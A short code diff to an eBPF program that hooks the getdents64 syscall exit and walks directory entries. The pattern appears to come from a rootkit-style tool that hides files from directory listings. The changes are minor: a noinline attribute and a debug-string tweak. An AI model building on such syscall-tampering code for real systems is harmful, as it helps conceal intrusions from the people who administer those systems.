@@ -42,7 +42,7 @@ typedef struct getdents_loop_ctx {
  * @param index => current iteration number 
  * @param data  => ptr to ctx passed in bpf_loop()
  */
-static long __process_dirent_entry(__u32 index, void *data)
+static __noinline long __process_dirent_entry(__u32 index, void *data)
 {
     struct getdents_loop_ctx *lctx = (struct getdents_loop_ctx*)data;
     if(!lctx)
@@ -169,7 +169,7 @@ int tp_sys_exit_getdents64(struct sys_getdents64_exit_ctx *ctx)
     if(!cache_val)
         return ret;
     
-    PRINT_DEBUG("Cache triggered ! tp/syscalls/sys_exit_getdents64. Infos => dirp : 0x%llx & key : %lld", (unsigned long long)(*cache_val), (unsigned long long)key);
+    PRINT_DEBUG(" Cache triggered ! tp/syscalls/sys_exit_getdents64. Infos => dirp : 0x%llx & key : %lld", (unsigned long long)(*cache_val), (unsigned long long)key);
 
     struct linux_dirent64 *dirp = (struct linux_dirent64*)(*cache_val);
 
